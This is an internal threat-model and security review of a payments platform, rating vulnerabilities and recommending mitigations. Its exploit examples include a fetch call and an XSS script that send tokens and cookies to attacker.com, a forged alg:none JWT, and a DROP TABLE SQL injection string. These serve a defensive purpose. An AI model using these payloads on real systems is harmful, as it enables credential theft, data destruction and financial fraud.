# DispatchPay Security Review

**Classification**: Internal — Confidential  
**Review Type**: Threat Model / Ethical Hacker Audit  
**Scope**: Authentication, Authorization, OTP, Payments, API, Transport, and Data layers

This document reviews the DispatchPay system design from the perspective of an ethical hacker and a defensive security engineer. For each vulnerability surface, we identify the threat, describe a realistic exploit scenario, assign a severity rating, and recommend precise mitigations.

---

## Severity Rating Scale

| Rating | Meaning |
| :--- | :--- |
| 🔴 **Critical** | Exploitable remotely with high impact on financial data or system integrity |
| 🟠 **High** | Significant data exposure or privilege escalation risk |
| 🟡 **Medium** | Limited scope but real exploit pathway |
| 🟢 **Low** | Defense-in-depth improvements with low immediate risk |

---

## 1. Authentication Risks

### 1.1 Business Admin Credential Brute-Force
**Severity**: 🔴 Critical

**Threat**: An attacker scripts a credential-stuffing campaign against `POST /auth/business/login`, cycling through email/password pairs from previous data breaches (e.g., HaveIBeenPwned databases). Since business admin accounts control wallet funding and payout approvals, account takeover has direct financial impact.

**Exploit Scenario**:
```
for password in breached_password_list:
    POST /auth/business/login
    body: { email: "owner@target.com", password: password }
    → On hit: Extract tokens. Fund attacker wallet. Approve rogue payouts.
```

**Mitigations**:
1.  **Strict Rate Limiting**: Maximum 5 failed attempts per email address per 15-minute window, tracked in Redis. Lock account for 30 minutes after breach.
2.  **Progressive Delays**: Introduce a 500ms artificial delay per failed login attempt to limit throughput.
3.  **TOTP MFA Enforcement**: Make MFA mandatory for all `BUSINESS_OWNER` and `BUSINESS_MANAGER` roles — not optional. A compromised password alone must never grant access.
4.  **Login Anomaly Alerts**: Dispatch email alert on login from an unrecognized IP or user agent.

---

### 1.2 Access Token in Local Storage
**Severity**: 🔴 Critical

**Threat**: If any third-party script, browser extension, or XSS injection is present on the Dashboard SPA, and the access token is stored in `localStorage` or `sessionStorage`, the attacker can exfiltrate it trivially:
```javascript
fetch('https://attacker.com/?token=' + localStorage.getItem('accessToken'));
```

**Mitigation**:
- Access tokens must **only** exist in JavaScript memory (`AuthContext` state). They are **never** written to `localStorage`, `sessionStorage`, `IndexedDB`, or cookies accessible to JavaScript.
- This was already noted in the design; this review enforces it as a hard system requirement.

---

### 1.3 JWT Algorithm Confusion Attack (`alg: none`)
**Severity**: 🔴 Critical

**Threat**: Some JWT libraries accept `"alg": "none"` in the token header, allowing an attacker to forge any payload without a valid signature. An attacker could craft a token with `"role": "SUPER_ADMIN"` and gain full platform access:
```json
// Forged header
{ "alg": "none", "typ": "JWT" }

// Forged payload
{ "id": "usr_fake", "role": "SUPER_ADMIN", "businessId": null }
```

**Mitigation**:
- Explicitly configure the JWT library to **whitelist only `HS256` or `RS256`**. Never allow `none`.
- Use RS256 (asymmetric) in production so that token signing requires the private key (kept only on the server), while verification only requires the public key.

---

### 1.4 Refresh Token Theft via Network Interception
**Severity**: 🟠 High

**Threat**: If TLS is misconfigured or a MITM proxy is present on an uncontrolled network (common in Ghanaian public Wi-Fi hotspots used by delivery businesses), the refresh token cookie could be intercepted in transit.

**Mitigation**:
- **Enforce HTTPS Everywhere**: HSTS header with `max-age=31536000; includeSubDomains; preload`.
- **Cookie `Secure` flag**: Strictly enforce. The `Secure` attribute prevents the browser from transmitting cookies over HTTP.
- Add the domain to the HSTS preload list.

---

## 2. Authorization Risks

### 2.1 Broken Object-Level Authorization (BOLA / IDOR)
**Severity**: 🔴 Critical

**Threat**: The most critical vulnerability class in API-driven platforms. If the delivery endpoint `GET /deliveries/:id` resolves the delivery using only the `id` path parameter without verifying the requesting user's `business_id` matches the delivery's `business_id`, an authenticated attacker from Business A can read delivery records from Business B:
```
// Attacker is authenticated to Business A (biz_attacker)
GET /api/v1/deliveries/del_726a_businessB
Authorization: Bearer <Business A token>

// Vulnerable server: SELECT * FROM deliveries WHERE id = 'del_726a_businessB'
// Returns Business B's delivery data. 💀
```

**Mitigation**:
- **Every single query** against a tenanted resource must include `AND business_id = req.user.businessId` in the WHERE clause.
- Write a middleware function `assertTenantOwnership(resourceBusinessId, jwtBusinessId)` that throws a `ForbiddenError` on mismatch.
- Implement integration tests that specifically verify cross-tenant data isolation.

---

### 2.2 Rider Self-Elevation via Role Parameter
**Severity**: 🟠 High

**Threat**: If the registration endpoint or profile update endpoint accepts a `role` field in the request body and the API trusts it without stripping it, a Rider could register themselves as a `BUSINESS_OWNER`:
```json
POST /auth/rider/register
{ "firstName": "Kwame", "role": "BUSINESS_OWNER" }
```

**Mitigation**:
- The `role` field must **never** be part of any client-controlled input schema. Roles are assigned server-side based on the calling endpoint context.
- Strip all unlisted fields before processing using Zod's `.strict()` parser mode.

---

### 2.3 Payout Approval Without Business Wallet Check
**Severity**: 🔴 Critical

**Threat**: A `BUSINESS_MANAGER` approves 50 rider payouts simultaneously without the business wallet having sufficient funds. If the ledger debit check is done before the approval but not atomically inside the transfer loop, a race condition allows more payouts than the balance supports:
```
Business Wallet: GHS 200
Concurrent approvals: 5 × GHS 50 requests

Thread 1: Balance check → 200 >= 50 ✓
Thread 2: Balance check → 200 >= 50 ✓  (Thread 1 hasn't written yet)
Thread 1: Debit 50. Balance: 150
Thread 2: Debit 50. Balance: 100  ← Should be blocked
... overdraft possible
```

**Mitigation**:
- All wallet deductions must execute inside an **atomic database transaction** with `SELECT ... FOR UPDATE` row-level locking (or Turso's transaction isolation).
- Enforce a final balance check **inside** the transaction immediately before committing the debit.

---

## 3. OTP Vulnerabilities

### 3.1 OTP Brute-Force Enumeration
**Severity**: 🟠 High

**Threat**: A 6-digit numeric OTP has only 1,000,000 possible values. With no rate limiting, an attacker can brute-force all combinations in under 17 minutes at 1,000 requests/second:
```
for code in range(000000, 999999):
    POST /auth/rider/verify-otp
    body: { phoneNumber: "+233240123456", code: str(code).zfill(6) }
```

**Mitigation**:
1.  **Hard attempt limit**: Maximum 3 incorrect guesses per OTP session. On 4th failure, the OTP is invalidated and a new one must be requested.
2.  **Short TTL**: 5-minute expiry, strictly enforced.
3.  **Per-phone rate limit**: Maximum 3 OTP requests per phone number per hour to prevent OTP flooding.
4.  **Account lockout**: After 3 failed sessions in 1 hour, temporarily lock OTP issuance for that phone.

---

### 3.2 OTP Session Fixation
**Severity**: 🟡 Medium

**Threat**: If the OTP verification endpoint accepts only a `phoneNumber` and `code` (without a session-binding `otpId`), an attacker who has intercepted an OTP reference from a SMS delivery confirmation could submit an OTP code from a different session:
```
// Attacker observes the otpId from a leaked reference
POST /auth/rider/verify-otp
{ "phoneNumber": "+233240123456", "code": "123456" }
// No session binding = OTP reuse across sessions
```

**Mitigation**:
- Always require the `otpId` in the verification payload. The server validates that the submitted `otpId + phoneNumber + code` triple matches the Redis record exactly.
- The Redis key is structured as: `otp:<otpId>` → `{ phone, hashedCode, expiresAt, attempts }`.

---

### 3.3 OTP Stored in Plain Text
**Severity**: 🟠 High

**Threat**: If the OTP code is stored as plain text in the `otp_verifications` database table or Redis, a database breach exposes active OTP codes that can be used immediately for unauthorized logins.

**Mitigation**:
- Store only the **bcrypt or SHA-256 hash** of the OTP code in Redis/DB, not the raw code.
- During verification, hash the submitted code and compare against the stored hash.

---

## 4. Payment Vulnerabilities

### 4.1 Moolre Webhook Spoofing
**Severity**: 🔴 Critical

**Threat**: The `/payments/webhook` endpoint is publicly accessible. An attacker who discovers its URL can forge a successful payment webhook, causing the DispatchPay backend to credit a business wallet with funds that were never actually transferred:
```json
POST /api/v1/payments/webhook
{
  "transactionReference": "moolre_funding_ref_ANY",
  "status": "SUCCESS",
  "amount": 999999.00
}
// If no signature verification: business wallet credited with GHS 9,999,990!
```

**Mitigation**:
- **Mandatory HMAC verification**: Compute `HMAC-SHA256(webhookSecret, rawRequestBody)` and compare against `X-Moolre-Signature` header using `crypto.timingSafeEqual()` (not `===` which is vulnerable to timing attacks).
- **Reject on mismatch**: Return `401 Unauthorized` immediately. Do not process the payload.
- **Reference validation**: Even after signature passes, confirm the `transactionReference` exists in the local `payments` table in `PENDING` state before crediting.

---

### 4.2 Double-Credit via Webhook Replay
**Severity**: 🔴 Critical

**Threat**: An attacker who captures a legitimate webhook payload (e.g., via a MITM proxy or compromised log system) replays it to credit a wallet twice:
```
// First delivery: legitimate webhook → wallet credited GHS 500
// Replay same payload 5 minutes later → wallet credited again? 
```

**Mitigation**:
- Implement **webhook idempotency**: Store processed `transactionReference` values in a database table with a unique index. On receipt, check if the reference has been processed before committing any ledger changes.
- Return `200 OK` on duplicate (Moolre expects acknowledgment), but perform no database writes.

---

## 5. API Abuse

### 5.1 Missing Global Rate Limiting
**Severity**: 🟠 High

**Threat**: Without global rate limiting, an attacker can abuse any endpoint freely — scraping all rider data, flooding delivery creation, or exhausting database connection pools.

**Mitigation**:
- Apply **tiered rate limits** using Upstash Redis:
  - Global: 100 requests/minute per IP.
  - Auth endpoints: 5 requests/minute per IP.
  - OTP endpoints: 3 requests/minute per phone number.
  - Financial endpoints (`/payouts`, `/payments`): 10 requests/minute per authenticated user.
- Return `429 Too Many Requests` with a `Retry-After` header.

---

### 5.2 Mass Assignment via Unrestricted PATCH
**Severity**: 🟠 High

**Threat**: If `PATCH /riders/:id` passes the raw request body directly to the Drizzle ORM update, an attacker could submit unexpected fields:
```json
PATCH /riders/usr_rider123
{ "momoNumber": "+233299999999", "businessId": "biz_attacker", "isActive": true }
```
A mass assignment bug would allow the rider to change their `businessId`, effectively jumping tenants.

**Mitigation**:
- Use Zod schemas with **explicit `pick()`** to whitelist only the fields that the specific endpoint is allowed to modify.
- Never spread or pass `req.body` directly into database update calls.

---

## 6. Injection Risks

### 6.1 SQL Injection (via Raw Queries)
**Severity**: 🔴 Critical

**Threat**: If any developer bypasses Drizzle ORM and writes raw SQL strings by concatenating user input, an attacker can inject arbitrary SQL:
```typescript
// DANGEROUS — never do this
db.run(`SELECT * FROM riders WHERE phone = '${req.body.phone}'`);

// Exploit payload:
phone = "'; DROP TABLE riders; --"
```

**Mitigation**:
- **Mandatory Drizzle ORM for all queries** — no raw SQL string concatenation ever.
- If raw SQL is unavoidable, use **parameterized queries exclusively**:
  ```typescript
  db.run(sql`SELECT * FROM riders WHERE phone = ${req.body.phone}`)
  ```
- Add an ESLint rule (`no-restricted-syntax`) that flags string concatenation near `db.run` or `db.prepare`.

---

## 7. XSS (Cross-Site Scripting)

### 7.1 Stored XSS via Delivery Address Fields
**Severity**: 🟠 High

**Threat**: Delivery addresses (pickup/delivery) entered by business managers are eventually rendered in the Business Dashboard and shared in rider notification views. If these fields are not sanitized, a malicious manager could inject a script that runs in another user's browser:
```json
{ "deliveryAddress": "<script>fetch('https://attacker.com?c='+document.cookie)</script>" }
```

**Mitigation**:
- **Output encoding**: All user-supplied text rendered to the DOM must be encoded. In React, JSX's `{value}` syntax is safe by default (it HTML-encodes). **Never use `dangerouslySetInnerHTML`** with user-supplied content.
- **Zod input sanitization**: Add `.regex(/^[a-zA-Z0-9\s,.\-]+$/)` or use a library like `DOMPurify` server-side for any address or notes fields that may be rich-text.
- **Content Security Policy (CSP)**: Enforce a strict CSP header:
  ```
  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
  ```

---

## 8. CSRF (Cross-Site Request Forgery)

### 8.1 CSRF on State-Mutating Endpoints
**Severity**: 🟡 Medium

**Threat**: If the refresh token cookie is accessible across origins (i.e., `SameSite` is not set to `Strict`), a malicious website visited by an authenticated business admin could trigger state-mutating API calls using the admin's existing session cookie:
```html
<!-- On attacker's website -->
<img src="https://api.dispatchpay.com/api/v1/payouts/poy_123/approve">
```

**Mitigation**:
- **`SameSite=Strict`**: Already specified in the design. This single attribute prevents the browser from sending cookies on cross-origin requests.
- **`Origin` header validation**: For all state-mutating requests, verify the `Origin` or `Referer` header matches the allow-listed domains.
- **Double-submit CSRF token**: For additional defense-in-depth on high-risk financial endpoints, generate a CSRF token on login and require it in a custom header (`X-CSRF-Token`).

---

## 9. Replay Attacks

### 9.1 JWT Replay After Logout
**Severity**: 🟠 High

**Threat**: After a rider logs out, their access token (15-minute TTL) remains mathematically valid. If the token was previously captured (e.g., from a shared device, a log dump, or an intermediary proxy), it can be replayed until it expires:
```
// Rider logs out at 12:00
// Token expires at 12:15
// Attacker replays token at 12:10 → Server accepts it!
```

**Mitigation**:
- Maintain a **token revocation blocklist** in Redis: On logout, add the JWT's `jti` (JWT ID — a UUID embedded in every token) to a Redis set with a TTL matching the token's remaining validity period.
- On every authenticated request, check whether `jti` exists in the blocklist before processing.

---

## 10. Sensitive Data Exposure

### 10.1 Logging Sensitive Fields
**Severity**: 🟠 High

**Threat**: If structured JSON logs inadvertently capture request bodies or database objects containing MoMo numbers, OTP codes, JWT tokens, or password hashes, a log exfiltration attack exposes sensitive financial and PII data.

**Mitigation**:
- Implement **log scrubbing** at the `pino` serializer level. Define a list of forbidden field names:
  ```typescript
  const REDACTED_FIELDS = ['password', 'passwordHash', 'otpCode', 'accessToken',
    'refreshToken', 'momoNumber', 'cvv', 'cardNumber'];
  ```
- Any log object containing these keys replaces the value with `"[REDACTED]"` before writing to the log sink.

---

### 10.2 API Responses Leaking Internal Schema
**Severity**: 🟡 Medium

**Threat**: A Drizzle query that selects `*` from the `users` table and returns the raw result to the client will expose `passwordHash`, `is_active` internal flags, and other fields not intended for the frontend.

**Mitigation**:
- **Never return raw database row objects**. Always map database entities to explicit DTO (Data Transfer Object) shapes before serializing the API response.
- Use Fastify's `reply.schema` response serialization to whitelist output fields at the route level.

---

## 11. Security Headers Checklist

The following HTTP security headers must be enforced by the API and CDN layers:

| Header | Recommended Value | Purpose |
| :--- | :--- | :--- |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | Enforce HTTPS |
| `Content-Security-Policy` | `default-src 'self'; object-src 'none'` | Block XSS |
| `X-Content-Type-Options` | `nosniff` | Prevent MIME sniffing |
| `X-Frame-Options` | `DENY` | Prevent clickjacking |
| `Referrer-Policy` | `no-referrer` | Hide URL from third parties |
| `Permissions-Policy` | `geolocation=(self), camera=(), microphone=()` | Restrict browser APIs |

---

## 12. Summary Risk Matrix

| # | Vulnerability | Severity | Effort to Fix |
| :--- | :--- | :--- | :--- |
| 1.1 | Admin brute-force login | 🔴 Critical | Low |
| 1.2 | Access token in localStorage | 🔴 Critical | Low |
| 1.3 | JWT algorithm confusion | 🔴 Critical | Low |
| 1.4 | Token in transit (no HSTS) | 🟠 High | Low |
| 2.1 | BOLA / IDOR cross-tenant reads | 🔴 Critical | Medium |
| 2.2 | Role self-elevation | 🟠 High | Low |
| 2.3 | Payout overdraft race condition | 🔴 Critical | High |
| 3.1 | OTP brute-force | 🟠 High | Low |
| 3.2 | OTP session fixation | 🟡 Medium | Low |
| 3.3 | OTP stored plain text | 🟠 High | Low |
| 4.1 | Webhook spoofing | 🔴 Critical | Low |
| 4.2 | Webhook replay double-credit | 🔴 Critical | Medium |
| 5.1 | Missing global rate limiting | 🟠 High | Medium |
| 5.2 | Mass assignment via PATCH | 🟠 High | Low |
| 6.1 | SQL injection via raw queries | 🔴 Critical | Low |
| 7.1 | Stored XSS via address fields | 🟠 High | Low |
| 8.1 | CSRF on state-mutating routes | 🟡 Medium | Low |
| 9.1 | JWT replay after logout | 🟠 High | Medium |
| 10.1 | Sensitive fields in logs | 🟠 High | Low |
| 10.2 | Internal schema exposure in API | 🟡 Medium | Low |

---

## 13. Recommended Implementation Priority

**Phase 1 — Before Any Code Ships (Zero Tolerance)**
- Fix 1.2 (token storage), 1.3 (alg:none), 2.1 (tenant isolation), 4.1 (webhook HMAC), 4.2 (webhook idempotency), 6.1 (parameterized queries only).

**Phase 2 — Before Beta Launch**
- Fix 1.1 (rate limiting login), 2.3 (atomic payout transactions), 3.1 (OTP limits), 3.3 (hashed OTPs), 10.1 (log scrubbing), 9.1 (JWT blocklist).

**Phase 3 — Before Production**
- Fix 1.4 (HSTS), 2.2 (Zod strict), 5.1 (global rate limiting), 7.1 (CSP), 8.1 (CSRF tokens), 10.2 (DTO serialization), all security headers.
